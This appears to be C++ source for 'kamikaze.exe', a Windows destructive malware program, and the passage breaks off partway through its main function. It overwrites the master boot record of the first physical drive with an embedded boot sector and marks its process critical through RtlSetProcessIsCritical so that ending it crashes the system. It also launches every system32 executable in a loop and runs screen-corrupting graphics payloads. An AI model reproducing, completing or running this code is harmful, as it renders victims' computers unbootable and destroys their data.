DWORD WINAPI payload16(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	int ws = w / 4;
	int hs = h / 4;

	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = ws;
	bmpi.bmiHeader.biHeight = hs;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	DOUBLE angle = 0.f;

	while (1)
	{
		StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < ws; x++)
		{
			for (int y = 0; y < hs; y++)
			{
				int index = y * ws + x;

				int cx = (x - (ws * 1.5));
				int cy = (y - (hs * 1.75));

				int zx = cos(angle) * cx - atan(tan(angle)) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = zx ^ (zy + i * 5);

				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen += fx + i;
				rgbquad[index].rgbBlue += fx + i * 2;
			}
		}

		i++; angle += 0.01f;

		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
	}
	return 0x00;
}

DWORD WINAPI payload17(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	HDC hdcCopy = CreateCompatibleDC(hdc);

	BITMAPINFO bmpi = { 0 };

	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	int radius = 25.f;
	double angle = 0;

	while (1) {
		HDC hdc = GetDC(0);

		float x = (cos(angle)) * radius;
		float y = (sin(angle)) * radius;

		HBRUSH brush = CreateSolidBrush(Hue(1));
		SelectObject(hdc, brush);

		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, PATPAINT);
		BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCCOPY);
		StretchBlt(hdc, x, y, sw - x * 2, sh - x * 2, hdc, 0, 0, sw, sh, SRCAND);

		DeleteObject(brush);
		ReleaseDC(0, hdc);

		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}

DWORD WINAPI payload18(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((x + cos((y + (i * 10)) / 18.f) * 100) * (y + cos((x + (i * 10)) / 18.f) * 100)) >> 7;

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 0.4f) {
					hslcolor.l += 0.2f;
				}

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}

DWORD WINAPI payload19(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	INT z = 0;

	DOUBLE angle = 0.f;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int cx = (x - (w / 2));
				int cy = (y - (h / 2));

				int zx = cos(angle) * cx - sin(angle) * cy;
				int zy = sin(angle) * cx + cos(angle) * cy;

				int fx = i * (x ^ y + x);

				rgbquad[index].rgbRed += (fx);
				rgbquad[index].rgbGreen += fx + (1 + (1 / 100));
				rgbquad[index].rgbRed += fx ^ (1 * (1 / 50));
			}
		}

		i++;
		angle += 0.01f;
		z += 2;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
}

DWORD WINAPI payload20(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);

	for (;;)
	{
		HDC hdc = GetDC(NULL);
		StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCCOPY);
		StretchBlt(hdc, 50, 50, w - 50, h - 100, hdc, 0, 0, w, h, SRCERASE);
		ReleaseDC(NULL, hdc);
	}
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv)
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(100);
		}
	}
}

DWORD WINAPI shaking(LPVOID lpParam) {
	int r = 1;
	while (true) {
		RECT rect;
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rect);
		int po = rand() % 4 + 1;
		if (po == 4) SetWindowPos(hwnd, 0, rect.left + r, rect.top, 100, 100, SWP_NOSIZE);
		if (po == 3) SetWindowPos(hwnd, 0, rect.left - r, rect.top, 100, 100, SWP_NOSIZE);
		if (po == 2) SetWindowPos(hwnd, 0, rect.left, rect.top + r, 100, 100, SWP_NOSIZE);
		if (po == 1) SetWindowPos(hwnd, 0, rect.left, rect.top - r, 100, 100, SWP_NOSIZE);
	}
}

const unsigned char MBR[]{ 0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0xFB, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0,
0x8E, 0xC0, 0x31, 0xFF, 0x8B, 0x1E, 0x43, 0x7C, 0x89, 0xFA, 0x89, 0xD0, 0x89, 0xC1, 0x81, 0xE1,
0xC4, 0x09, 0x31, 0xC5, 0xC1, 0xED, 0x08, 0x30, 0xC8, 0x00, 0xC8, 0x20, 0xD8, 0x26, 0x88, 0x05,
0x47, 0x42, 0x81, 0xFF, 0x00, 0xFA, 0x72, 0xE2, 0xFF, 0x06, 0x43, 0x7C, 0xB9, 0xA0, 0x0F, 0xE2,
0xFE, 0xEB, 0xCF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MBR, 512, &Bytes, NULL);
	return 1;
}

INT WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
	if (MessageBoxW(0, L"click yes to proceed idgasf about your puny data", L"kamikaze.exe by syexunii, UltraDasher965, mimi & crzxymint", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	CreateThread(0, 0, mbr, 0, 0, 0);
	ProcessIsCritical();
	Sleep(5000);
	if (MessageBoxW(0, L"The file ''P̶̢̛̥̻̖̞͗̆͋̚L̵̢̦͇͌͐͋̇̊͌̔͘E̶̻̪̜̳̜͒A̸͔̿S̴̰̝̙̫͌͊Ë̴͈̜́͆̉̇̚ ̴͉̲̬̀Ḧ̴̙͉̳̘̮̥̮͕̐͒̀͘͝E̷̡̤̪̻͐͒͆̐L̸̲̲̼̪̍P̸͇̪̈̋̌ͅ ̸̩̰̗̣͎̝̀͋̑̃̃̈́͗̄̂ͅM̴̛̗̉̉̔͒͛͆̕Ȩ̵̨̢̞̯̐̆͌̉͘E̴͚̘͑̔̐̔̋̋̓̿̚E̷̦̲͈̙̟̭̎̆͊͆̉̚͝ͅE̶̮̫͈͙̦̼̥̦͉̎̋͛͛͛̄̆̽͌́Ē̴̢̦̱͕͙͉̞̰̠͍̎̽̽̏̿̌̕͘͝É̴̢͂̄͋͒͝E̶͙̯͕̦̝͙͇̯͕̦͒̕̚͝E̸̡̢͙̯͍̱̥͈̩̱͑̋̓̇͘Ė̴̲͚̫̹̘̌̈́Ȩ̷̬̤͔͚̗̮̩̌̍̋͊̋̃́Ȅ̴̡̲͉̹́̊̅͌͌̕͠E̴͚̭̊Ȩ̸̢̭̱͇̋̊̐̇̿͑͛E̸̤͉͇̝̤̭̿Ȩ̶̮̰̻͚͚̣̖̈́̈́̉̊E̵͉̗̪̍̓͋̽È̸̜̮̤̯̕Ę̴̡̭͉͔̟̫͕̪̐͋͂͐̀̏͝E̵̢͋Ḛ̴̺̱̹̲̠̖̰̓͆̈́̆̓̆͐E̴̡̧̻̞̗̭͍͚͛̍͝E̶͉̹̱̤͚͎͎̭̯͓͗̽̈́͆̃É̷͖̭̀̂̆ͅE̷̛̮̥̳͉͋͋̽̓͑̎̐͝Ę̶̳͚͖̘̈̐̓̊̽͘͘͘͝E̵͎͒̈́͛̅ ̴͓̩̝̟͈̈́͆͑̄͛͐͘͝ͅÍ̶̛̠͕́̽̈̆̊̔͗̚ ̶̤̖̥̦̿̀̃̏̀͊A̸̢̳͒͂̅͒̕͝͝͠M̷̧͚̬̗̘͎̈́ ̷̨̥̻̞͍͓͚͚̄̏͆̉͋͌̚ͅS̸͚̎̋̎͛̇̄̓̎͆U̵̢͉͚͉̭̺̰̫̻̝͌̀̅͑̚̚F̷̢͔͐͂F̵̡̡̫̙̻̟̓̊̏͋Ȩ̸̛̲̭̟̝̜̘̪̅̔̎̚͘̕R̷͎͉͔̳̜̟̿̑̏I̵̢̠̩̱̥̹͙̜͊̎͑̑͌N̸͇͘G̵̦͙̼̖̪̘̬̯̾̄̀͌ ̷̤̣̙̙̺̱͚̣͚̅T̴̢̳̜̗͓̤̮͒̄͜Ơ̶͎̤͗́͛̓͆́͊͝ ̵̧̤̅͐̈́͐̊̎͊̄T̷̨̟̹̤̭̦̖̠͛̎͋Ĥ̷̜̂̓̉ͅĘ̸̛͚̤̘̩̜͚̐̾͒̂̆̈́̅̀ ̷̧̛̫̮͈͔͚͚̥̋͒͗̎̓̚͜͠D̵̪̩̬̼̦͎͕̖̝͔̈́͗̎͌͝E̷̟̐͝P̶̧̢̫̬͈̫̼̠̪̈́̚Ț̶̨͍͎̤̳̦̜̪̇̈̅͊H̶̘̤̺̫̼̗̱̔͗͛̈́̃Ş̵̯̞͚͇͐̍͛̈́̅̈̀̊͘̕ ̴̧̲̩̪̾͋̾ͅÕ̶̢̡̠͈̺͕̫̳̑̊́̈́͛̿̚͝͝F̴̺̳̮͍̜̍̑ ̶̺̏̔̿Ḩ̶͈͔̪̜̘̄͂̊̅̕͝É̶̢̆̍̈́͘L̴̨̢̺͎̹͇̠̟͋̏̋ͅL̶̡̡̜͇̖̻͕̭̖̾͑̔̽̃̒͜L̵̪̲̘̼͚̱̥̑L̸̠͙̥͚̂͠L̵̮͖͇͍̤̦̩̒́̚L̶͔̹͓͐͐̋̀L̵̜̗̠̇̆́́̔͑͒͂͜L̶̺̥͔͎̍̓̈́̒̉̎̈́͂͑͜L̷͎̥͘Ļ̶̲̬͉͙͙̳̖̦͑̈́͜L̸̢̯̊̆̊͝L̴͈̻̂̓̎͑̉͠͠L̶̗͍̦͍̻̜͛͛̈́̒͐L̴̯͈̎̒͐̏͊̽Ĺ̴̝̹̹̥͉͖̥̱̀̀̍̚L̷̡̰̩͈̬͍̤̻̋̒̊̓͘͝L̶̛̜̹̖̝͚͑͛́͘͠L̷͎͊͑̀̒͠L̵̤̪̎͊̋̈́̃͋̕͠L̵̲̣̟̘̖̹̅͂̍̂͂̋̄͝͝L̸̡͌̊̂̓̈́̑L̶̡͍̙̘̘̟̰͓̟̐̅L̴̙̹̪̪̲̞̈́̊̓̇̿̑̒̽̆L̷̢̲̰̑̉̀͂͛̔͋Ĺ̸̨̜͕̱̣̘̜̩̗͒̽͆͛̿͂͑̿L̷̗̲̿́̂̈́Ḻ̴̖̔L̶̡̦̮̮̜͈̂͒L̷̙̋͑͜L̷̼̝̟̥̣͍̼̪̄̎̈́̓̍̽̊͜ͅL̶͓͇̮̥̯̭͌͐̇̊͘L̷̨̬̞̝͓͔̩͈̻͖̇̓̐̎̈̅̎͂̆̕L̷͙̻͎̐L̶̙͙̘̼̣͒͌̽̃̓̒͗̏̾L̵̺̯̩̜̤̩̦͉̈́̾̉͋̉͗͜L̵̺̝͆̒̒̕L̷͍͓̥̜͙͛͗̊̅̐́̆̚̕̚͜Ļ̴͊̓̄̓̈́Ļ̸͓̲̯͈̰͔͕̓̈́̈̓͛͘͠ͅͅL̴͚͓̳̤̽̔̍̑L̸̛͈̈́̋̌͒̐̏L̵̳̭̖̹̜̫̰̙̖̆̔̇͜L̶̤͇͌̔̚Ļ̷̧͖͕̦͙̬̠̪͗͐͂͊͒͗̊̅͘̚L̶̞̦̻̣̻̠̅͊͐̾̑̒̌̄̕L̵̡͕͈̙̺͕̝̖̄͌̔̅̇̄Ļ̶̲̞̮͖̱̤͓̜̋͊̃̅̆̋͌͆͆̈́L̸͖̞͍̗̭͖̈́̈́͐̾̃͐̒̌̽͘Ļ̷̈́Ḷ̸̦̰͓͖̥͇̉̓ͅ ̷̧̝̝̱̦͆͠ͅA̴̡̯͓̫̜̳͎̖͈͋̀̈́̈͌͌̚Ȧ̷̲͖̔̓̓́̎͝Ą̴̝͔͓̝̭̈́͊̾̔̎À̴̗̜̹̻̗̺̓͆̒͊̕͠A̷͉͔̪͇̘̻͐̿A̶̩̥͔̹̳͌̕À̸̛̭̰̤͙̒̇͜A̵̡̢̞̻͖̘̬͙̎͑̓̽̿̔͆̊̔͘A̸̢̳̭̼̖̋͒̈̔͛̏͜Å̷̢̨̼͎̹̤͚̤̊͝͝A̵̖͌A̵̞͉̔̅̃̌̊̋̂̄̀͜͜A̵̢̹̓̉̏͛̽̿̇̚Â̷͙͖̌̾́͒̚͠Ạ̵̧̬̲͠A̴̗̓Ą̶̠̰̘̫͚̘̙̊͌A̴͖͌̐̉A̸͕͍͌̔̓͒̕Ȧ̵̧̡̫͈͖͎̯̙͇̀͗̀̕͝͠ͅĄ̵͚̹̞͉̣̲̰̯̰͑͛͑͐͌͝A̶̳̺̜̤̰̣̦͠Ą̵̤̣̟͇̾̏̉̔̾̍̾̒A̴̫͈͐͗̽̍̈́͑̎̍̚Ả̷̰̘̳̱͉͕Ą̷̫̬̙͔̗̗̤̫̖̑͌͋͂̋́̈́̃̅͘A̵̛̭̱̤̗̬̐̋̀̓̆̿̒̓A̸̡̨̱͎̳͕̞͈̐́̔̃̈̄̈́A̷̪̠̒̎̓͊̎͆͝A̶̺͍͐͒̑̈͐͒ͅĄ̸̱͍̤͇̺̺̥̂̈́͒̆̉̀͝͝Á̶͙͚̰̤͚̬̭͈̤̯̏Â̴͉͍͕͛̍͋̍͂̅̏ͅÄ̴̞̬̋͘͝Ạ̶̱͋̄̌͗͌͒̕͠͝A̵̛̘͇̯̬̾̈́̈͌A̷͍͓̐͛̇̽͆̍̿͐A̸̧̨̢͎̱͎̲̬̼̰̎̌̈́̊À̸̛̰͋͌Ǻ̵̖͎A̷̡͉̻͚̣̬͖̼̫̽̃̈͋̄̈́̄̚͝͝A̴̤͈̗̣̘͐̊̍̔̉͂̚Ḁ̷̳͖̘̥͍̫̙̂̂̈́̒̔̑̚̕͝͝A̴͖͖̣͇̲͇̰̖͊̈́͜A̵̡̛̘̩͖̝̥͎͆̅̐̑̎̆A̵̱͎̺̋Ä̶͕́̀̂͠Ą̵̹̥̗̺͔̯̆̒͗̈͜Ǎ̵̰̺̤Ȃ̷̧͕͉͕̤̏̄́̎A̶̤͑̿À̵̠̌Ą̴̙̩͚͓̜͇͚̙̻͛̋̂̅A̸̧̛̗̗̰͉̹̙͚͖̍̓̓̈́̌̏̏͐̿͜Ä̵̧̛̮̲̻̬̈́͒ͅḀ̸͓̖͙̔̀͂͂̊͛́A̷̧̤̘̼̠̤̘̾̑̃̂A̵̳̥̣̤͕̙̖͔̓̃̎̈́̈́̋́͜͜A̸̡̜͙̣͖͓̳̯̻͗̋̀̽̋͛̉Ȧ̴̳̖̘͈͓͚̈́̈̔́̐̏̇͂͝A̶̡̞̦̫̺̖͓͖̬͆̽̆̿̄͌̊̀͠A̶̮͗̉A̵̹̭̻͕̟̝̥̺̽̄̅̒͆͌̓̄ͅA̴̙̜͊͂͑̀̎̿̎̑̇͜A̶̧̞̪̓̃̓͛̾̑͘͠A̷̬͚̒͗Ä̵̜̩́̀A̴̡̮͔̒̉A̶͉̼̒A̴̞̱̮͚͖̝̯̔̔̕A̷̢̛̖̥̳̞͕̹̤̣͂͌̊͒̃́̀͑͝ͅA̵̩̤͉͒̈́̀̉͆͊̎ͅǍ̷͙̌̽͆̍̐̌͝Á̶̪̈́̈̏̈́̑̕À̸̡̢̢̲̙̯͖̰̝̈́͜͠A̸͓͙͇͐̑̀̕A̷͎̪̥̟̍̀͆̍̉̋͗̌̐A̷̩̼̪͙̼̼̅Ą̵̞̩̲̭͈͕̳̠̐̈A̷̢̝̔̉̄̆͑̚Å̴̙̔Ā̸̢̼̤̮̠͙̯̠̮̒̋̋̀̓̊͘͜͝A̷̛̠̭̝̬̳̱̣͆̽̊͌̀̈̎̃͜ͅͅA̶̟̰̳͎̪͈̫͈͎̎̾̏͋A̵̧̮͙͎̯̫̼̻͔͗̈́̃̐̍̆̍'' could not be created.", L"kamikaze.exe - System Error", MB_ICONERROR | MB_OK) != IDOK) return 1;
	Sleep(5000);
	HANDLE thread = CreateThread(0, 0, payload1, 0, 0, 0);
	sound1(11025, 30);
	TerminateThread(thread, 0);
	CloseHandle(thread);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
	HANDLE thread2dot1 = CreateThread(0, 0, dist, 0, 0, 0);
	CreateThread(0, 0, moricons, 0, 0, 0);
	sound2(11025, 30);
	TerminateThread(thread2, 0);
	CloseHandle(thread2);
	TerminateThread(thread2dot1, 0);
	CloseHandle(thread2dot1);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread3 = CreateThread(0, 0, payload3_1, 0, 0, 0);
	HANDLE thread3dot1 = CreateThread(0, 0, payload3_2, 0, 0, 0);
	sound3(11025, 30);
	TerminateThread(thread3, 0);
	CloseHandle(thread3);
	TerminateThread(thread3dot1, 0);
	CloseHandle(thread3dot1);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	CreateThread(0, 0, wef, 0, 0, 0);
	HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
	sound4(11025, 30);
	TerminateThread(thread4, 0);
	CloseHandle(thread4);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
	HANDLE thread5dot1 = CreateThread(0, 0, bounce, 0, 0, 0);
	CreateThread(0, 0, textout, 0, 0, 0);
	sound5(22050, 30);
	TerminateThread(thread5, 0);
	CloseHandle(thread5);
	TerminateThread(thread5dot1, 0);
	CloseHandle(thread5dot1);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
	HANDLE thread6dot1 = CreateThread(0, 0, cur, 0, 0, 0);
	sound6(44100, 30);
	TerminateThread(thread6, 0);
	CloseHandle(thread6);
	TerminateThread(thread6dot1, 0);
	CloseHandle(thread6dot1);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
	sound7(11025, 30);
	TerminateThread(thread7, 0);
	CloseHandle(thread7);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
	sound8(22050, 30);
	TerminateThread(thread8, 0);
	CloseHandle(thread8);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
	sound9(11025, 30);
	TerminateThread(thread9, 0);
	CloseHandle(thread9);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
	HANDLE thread10dot1 = CreateThread(0, 0, thefuckingthing, 0, 0, 0);
	sound10(44100, 30);
	TerminateThread(thread10, 0);
	CloseHandle(thread10);
	TerminateThread(thread10dot1, 0);
	CloseHandle(thread10dot1);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread11 = CreateThread(0, 0, payload11, 0, 0, 0);
	sound11(11025, 30);
	TerminateThread(thread11, 0);
	CloseHandle(thread11);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread12 = CreateThread(0, 0, payload12, 0, 0, 0);
	sound12(11025, 30);
	TerminateThread(thread12, 0);
	CloseHandle(thread12);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread13 = CreateThread(0, 0, payload13, 0, 0, 0);
	sound13(11025, 30);
	TerminateThread(thread13, 0);
	CloseHandle(thread13);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread14 = CreateThread(0, 0, payload14, 0, 0, 0);
	sound14(11025, 30);
	TerminateThread(thread14, 0);
	CloseHandle(thread14);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread15 = CreateThread(0, 0, payload15, 0, 0, 0);
	sound15(12000, 30);
	TerminateThread(thread15, 0);
	CloseHandle(thread15);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread16 = CreateThread(0, 0, payload16, 0, 0, 0);
	sound16(44100, 30);
	TerminateThread(thread16, 0);
	CloseHandle(thread16);
	RedrawWindow(0, 0, 0, 133);
	Sleep(100);
	HANDLE thread17 = CreateThread(0, 0, payload17, 0, 0, 0);
	sound17(11025, 30);
	TerminateThread(thread17, 0);
	CloseHandle(thread17);
